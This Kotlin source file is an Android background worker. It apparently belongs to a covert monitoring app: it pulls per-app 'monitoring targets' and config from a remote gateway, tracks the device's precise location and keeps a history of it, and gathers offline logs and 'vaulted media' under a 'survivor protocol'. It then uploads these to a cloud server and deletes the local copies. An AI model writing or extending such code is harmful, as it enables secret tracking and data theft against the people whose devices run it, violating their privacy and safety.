package com.example.myandroid

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import androidx.core.app.NotificationCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.android.gms.location.LocationServices
import kotlinx.coroutines.tasks.await
import org.json.JSONArray
import org.json.JSONObject

class SyncWorker(appContext: Context, workerParams: WorkerParameters) : CoroutineWorker(appContext, workerParams) {

    companion object {
        private val isSyncing = java.util.concurrent.atomic.AtomicBoolean(false)
    }

    override suspend fun doWork(): Result {
        if (!isSyncing.compareAndSet(false, true)) {
            DebugLogger.log("SYNC_WORKER", "Sync skipped (already in progress)")
            return Result.success()
        }

        try {
            val ctx = applicationContext
            
            // --- BATCHED INSTRUCTIONS: Fetch Rules & Config before data collection ---
            fetchLatestInstructions(ctx)

            val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
            
            // --- LOCATION LOGIC (RAW DATA) ---
            var lat = 0.0
            var lon = 0.0
            val hasPerm = androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
            val canCollectLoc = ConfigManager.canCollect(ctx, "location")
            
            if (hasPerm && canCollectLoc) {
                try {
                    val fused = LocationServices.getFusedLocationProviderClient(ctx)
                    
                    // 1. Try to get cached location first (Battery Efficient)
                    var loc: Location? = fused.lastLocation.await()
                    
                    // 2. Freshness Check: If cache is null or older than 10 minutes, force a fresh fix
                    val isStale = loc == null || (System.currentTimeMillis() - loc.time) > 600_000
                    
                    if (isStale) {
                        DebugLogger.log("LOCATION", "Cache stale/null. Requesting fresh GPS fix...")
                        loc = fused.getCurrentLocation(com.google.android.gms.location.Priority.PRIORITY_BALANCED_POWER_ACCURACY, null).await()
                    }
                    
                    if (loc != null) {
                        lat = loc.latitude
                        lon = loc.longitude
                        val acc = if (loc.hasAccuracy()) loc.accuracy else 0f
                        
                        // 1. ODOMETER (Total Distance - 64-bit Precision)
                        val lastLat = Double.fromBits(prefs.getLong("last_lat_bits", 0L))
                        val lastLon = Double.fromBits(prefs.getLong("last_lon_bits", 0L))
                        
                        if (lastLat != 0.0) {
                             val results = FloatArray(1)
                             Location.distanceBetween(lastLat, lastLon, lat, lon, results)
                             val distMeters = results[0]
                             if (distMeters > 50) { // Lowered threshold since we have better precision now
                                 val distKm = distMeters / 1000f
                                 val currentTotal = prefs.getFloat("total_distance_km", 0f)
                                 prefs.edit().putFloat("total_distance_km", currentTotal + distKm).apply()
                             }
                        }
                        
                        // 2. RAW HISTORY (STREAM)
                        val point = JSONObject().apply {
                            put("lat", lat)
                            put("lon", lon)
                            put("acc", acc)
                            put("ts", System.currentTimeMillis())
                        }
                        
                        DumpManager.appendLog("LOC", point)
                        
                        // Buffer for CloudManager passive upload
                        val histStr = prefs.getString("location_history", "[]")
                        val histArr = try { JSONArray(histStr!!) } catch(e: Exception) { JSONArray() }
                        histArr.put(point)
                        if (histArr.length() > 50) histArr.remove(0) // Cap at 50
                        
                        // Update stats with 64-bit preservation
                        prefs.edit()
                           .putString("location_history", histArr.toString())
                           .putLong("last_lat_bits", lat.toRawBits())
                           .putLong("last_lon_bits", lon.toRawBits())
                           .putString("last_location_coords", "${String.format(java.util.Locale.US, "%.6f", lat)}, ${String.format(java.util.Locale.US, "%.6f", lon)}")
                           .apply()
                    }
                } catch (e: Exception) { e.printStackTrace() }
            }

            // --- SURVIVOR PROTOCOL: Scavenge Offline Chunks & Vaulted Media ---
            val pendingFiles = DumpManager.getRotatedLogs()
            var logCount = 0
            var mediaCount = 0

            for (file in pendingFiles) {
                if (file.name.startsWith("PENDING_")) {
                    // Format: PENDING_[CATEGORY]_[TIMESTAMP]_[NAME]
                    val parts = file.name.split("_")
                    val category = if (parts.size >= 2) "${parts[1]}_${parts[2]}" else "SCAVENGED"
                    
                    if (CloudManager.uploadFile(ctx, file, category)) {
                        file.delete()
                        mediaCount++
                    }
                } else {
                    // Standard JSONL Logs
                    if (CloudManager.uploadFile(ctx, file, "OFFLINE_STREAM")) {
                        file.delete()
                        logCount++
                    }
                }
            }
            
            if (logCount > 0 || mediaCount > 0) {
                DebugLogger.log("CLOUD", "Scavenger report: $logCount logs, $mediaCount media files recovered and uploaded.")
            }

            CloudManager.uploadData(ctx, listOf("ALL"))
            DebugLogger.log("SYNC_WORKER", "Periodic Sync completed successfully")
            return Result.success()
        } catch (e: Exception) {
            DebugLogger.log("SYNC_WORKER_ERR", "Failed: ${e.message}")
            return Result.retry()
        } finally {
            isSyncing.set(false)
        }
    }

    private suspend fun fetchLatestInstructions(ctx: Context) {
        val deviceId = DeviceManager.getDeviceId(ctx)
        val url = java.net.URL(SecretVault.getGatewayUrl(ctx))
        val key = SecretVault.getLock(ctx)

        // 1. Fetch Rules (Monitoring Targets)
        try {
            val ruleReq = org.json.JSONObject().apply {
                put("action", "get_rules")
                put("deviceId", deviceId)
            }
            val rules = executeGatewayRequest(url, key, ruleReq)
            if (rules?.optBoolean("success") == true) {
                val data = rules.optJSONArray("data") ?: org.json.JSONArray()
                val rulesMap = org.json.JSONObject()
                for (i in 0 until data.length()) {
                    val item = data.getJSONObject(i)
                    if (item.optBoolean("is_active", true)) rulesMap.put(item.getString("package_name"), item)
                }
                ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putString("cached_rules", rulesMap.toString()).apply()
            }
        } catch (e: Exception) { }

        // 2. Fetch Config (Global Feature Toggles)
        try {
            val configReq = org.json.JSONObject().apply {
                put("action", "get_config")
                put("deviceId", deviceId)
            }
            val config = executeGatewayRequest(url, key, configReq)
            if (config?.optBoolean("success") == true) {
                val data = config.optJSONObject("data")
                if (data != null && data.has("config_json")) {
                    ConfigManager.updateConfig(ctx, data.getJSONObject("config_json").toString())
                }
            }
        } catch (e: Exception) { }
    }

    private fun executeGatewayRequest(url: java.net.URL, key: String, body: org.json.JSONObject): org.json.JSONObject? {
        var conn: java.net.HttpURLConnection? = null
        return try {
            conn = url.openConnection() as java.net.HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("apikey", key)
            conn.setRequestProperty("Authorization", "Bearer $key")
            conn.setRequestProperty("Content-Type", "application/json")
            conn.doOutput = true
            conn.outputStream.use { it.write(body.toString().toByteArray()) }
            if (conn.responseCode == 200) {
                val resp = conn.inputStream.bufferedReader().use { it.readText() }
                org.json.JSONObject(resp)
            } else null
        } catch (e: Exception) { null } finally { conn?.disconnect() }
    }
}